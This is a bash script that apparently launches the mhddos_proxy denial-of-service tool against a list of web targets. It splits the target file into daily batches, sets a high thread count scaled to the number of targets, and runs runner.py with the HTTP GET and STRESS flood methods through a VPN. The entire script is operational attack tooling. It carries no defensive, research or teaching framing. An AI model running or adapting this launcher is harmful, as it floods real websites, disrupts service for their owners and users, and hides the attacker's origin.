#!/usr/bin/env bash

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

BASE_DIR="$(dirname -- "$(readlink -f "${BASH_SOURCE}")")"
BASE_FILE='l7_get-stress.lst'
CURRENT_DAY=$(printf %02d `date +%d`)
DAYS_IN_MONTH=$(cal |egrep -v [a-z] |wc -w)
LINES=$(cat $BASE_DIR/../$BASE_FILE | wc -l)
LINES_PER_PART=$(python3 -c "print(round(float($LINES/$DAYS_IN_MONTH)))")
TARGETS_FILE="$BASE_DIR/../$BASE_FILE"
((THREADS=$LINES*(2**5)))

MAX_SPLIT_N=$(python3 -c "from math import ceil; print(ceil(float($LINES/$LINES_PER_PART)))")
if [ "$CURRENT_DAY" -gt "$MAX_SPLIT_N" ]; then
  CURRENT_SPLIT=$MAX_SPLIT_N
else
  CURRENT_SPLIT=$CURRENT_DAY
fi
TARGETS_FILE_SPLIT="$BASE_DIR/../$BASE_FILE.$CURRENT_SPLIT"

split --numeric-suffixes=1 -l $LINES_PER_PART $TARGETS_FILE "$TARGETS_FILE."

python3 runner.py \
  --config "$TARGETS_FILE_SPLIT" \
  --http-methods GET STRESS \
  --lang en \
  --threads "$THREADS" \
  --vpn
